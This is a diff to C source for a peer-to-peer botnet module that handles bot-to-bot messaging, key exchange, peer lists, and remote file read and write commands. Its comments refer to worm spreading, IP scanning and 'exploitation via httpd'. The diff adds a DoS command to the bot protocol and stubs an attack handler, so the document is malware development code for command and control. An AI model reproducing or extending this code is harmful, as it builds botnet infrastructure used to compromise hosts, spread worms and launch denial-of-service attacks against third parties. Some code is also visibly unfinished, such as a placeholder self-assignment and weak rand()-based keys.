@@ -25,7 +25,7 @@ ip generate seed can be used to ensure different bots scan different IPs
 #include <arpa/inet.h>
 #include <fcntl.h>
 #include "structs.h"
-#include "list.h"
+#include <list.h>
 #include "utils.h"
 #include "botlink.h"
 #include "portscan.h"
@@ -105,6 +105,7 @@ enum {
     BOT_CMD_PEER_INFO,
     BOT_CMD_WRITE_FILE,
     BOT_CMD_READ_FILE,
+    BOT_DOS_SURVEILLANCE
 };
 
 
@@ -125,7 +126,7 @@ typedef struct _botlink_channel {
 typedef struct _bot_header {
     uint32_t magic;
     uint16_t len;
-    //uint32_t checksum;
+    uint32_t checksum;
 } BotMSGHdr;
 
 
@@ -363,7 +364,7 @@ int bot_pushpkt(Modules *mptr, Connection *cptr, char *pkt, int pktsize) {
     int ret = -1;
     
     size = sizeof(BotMSGHdr) + pktsize;
-    if ((buf = (char *)calloc(pktsize + 1, 1)) == NULL) {
+    if ((buf = (char *)calloc(1,pktsize + 1)) == NULL) {
         return -1;
     }
     
@@ -414,12 +415,13 @@ int AuthorizationInsert(char *data, int len, int copy) {
     if (!copy) {
         aptr->data = data;
     } else {
-        if ((aptr->data = (char *)malloc(len + 1)) == NULL)
+        if ((aptr->data = (char *)calloc(1, len + 1)) == NULL)
             return -1;
 
         memcpy(aptr->data, data, len);
     }
     aptr->len = len;
+    aptr->start_ts = time(0);
     
     return 1;
 }
@@ -444,7 +446,7 @@ int bot_pushcmd(Modules *mptr, Connection *cptr, unsigned char cmd, char *pkt, i
     int size = pktsize + sizeof(CMDHdr);
     CMDHdr *hdr = NULL;
     
-    if ((buf = (char *)calloc(pktsize + 1, 1)) == NULL)
+    if ((buf = (char *)calloc(1,pktsize + 1)) == NULL)
         return -1;
     
     // setup header pointer.. and setup commands
@@ -505,11 +507,13 @@ int bot_sendkey(Modules *mptr, Connection *cptr) {
     
     // first generate a key
     key_size = 16 + rand()%32;
-    if ((key = (char *)malloc(key_size + 1)) == NULL) {
+    if ((key = (char *)calloc(1, key_size + 1)) == NULL) {
         ConnectionBad(cptr);
         return -1;
     }
     
+    // we need better crypto key generation...
+    // just here till complete
     for (i = 0; i < key_size; i++)
         key[i] = rand()%255;
     
@@ -523,7 +527,7 @@ int bot_sendkey(Modules *mptr, Connection *cptr) {
     // build packet to give key to other side
     key_pkt_size = sizeof(int32_t) + key_size;
     
-    if ((keybuf = (char *)calloc(key_pkt_size + 1, 1)) == NULL)
+    if ((keybuf = (char *)calloc(1, key_pkt_size + 1)) == NULL)
         return -1;
         
     // build final packet..
@@ -622,7 +626,7 @@ int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
     // set state to perform a normal connection
     cptr->state = BOT_PERFECT;
     
-    // after key exchange we will provide the opposide side with their IP address
+    // after key exchange we will provide the opposite side with their IP address
     // this will be useful for further worm, and exploitation via httpd/etc
     bot_pushcmd(mptr, cptr, BOT_CMD_REPORT_IP, (char *)&cptr->addr, sizeof(uint32_t));
     return 1;
@@ -681,6 +685,8 @@ int botlink_cmd_want_peers(Modules *mptr, Connection *cptr, char *buf, int size)
     for (i = 0; i < PEER_REQ_COUNT; i++) {
         
         // grab a random node.. and perform logic checks
+        // pick random between 0 and count and find it here.. (ensure we didnt already give it either)
+        // array works
         nptr = nptr;
                 
         if (nptr == NULL) break;
@@ -741,6 +747,7 @@ int botlink_message_exec(Modules *mptr, Connection *cptr, char *buf, int size, b
         //{ BOT_CMD_CONTROL_MODULE, &botlink_cmd_control_module, true, true },
         { BOT_CMD_READ_FILE, &botlink_cmd_read_file, 0, true, true },
         { BOT_CMD_WRITE_FILE, &botlink_cmd_read_file, 0, true, true },
+//        { BOT_DOS_SURVEILLANCE, &botlink_attack_surveillance, 0, true, false },
         { 0, NULL }
     };
     
